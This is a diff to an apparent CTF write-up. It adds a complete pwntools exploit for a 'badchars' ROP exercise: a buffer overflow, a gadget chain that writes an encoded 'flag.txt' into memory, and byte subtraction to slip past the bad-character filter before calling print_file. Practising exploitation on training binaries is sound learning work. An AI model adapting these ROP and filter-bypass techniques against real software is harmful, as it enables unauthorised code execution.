@@ -191,4 +191,38 @@ io.interactive()
 
 Some characters are not allowed (xor to store data, xor to get it back while in memory).
 
-`TBD`
+64-bit
+```python
+from pwn import *
+
+payload = b'A'*40 # offset
+print_file  = p64(0x7ffff7dc7a07)
+writeable   = 0x7ffff7ba5000
+
+# write to memory
+pop_r12_r13_r14_r15 = p64(0x40069c)
+mov_r13_r12 = p64(0x400634)
+pop_rdi     = p64(0x4006a3)
+
+payload += pop_r12_r13_r14_r15 + b'flbh/tyt' + p64(writeable) + p64(1) + \
+           p64(writeable+2) + mov_r13_r12 + pop_rdi + p64(writeable)
+
+
+# introducing bad chars
+pop_r15 = p64(0x4006a2)
+sub_r15_r14 = p64(0x400630)
+
+payload += sub_r15_r14
+payload += pop_r15 + p64(writeable+3) + sub_r15_r14
+payload += pop_r15 + p64(writeable+4) + sub_r15_r14
+payload += pop_r15 + p64(writeable+6) + sub_r15_r14
+
+# print file contents
+payload += print_file
+
+# io = gdb.debug('./badchars', 'b *pwnme+268')
+io = process('./badchars')
+io.sendline(payload)
+io.interactive()
+```
+
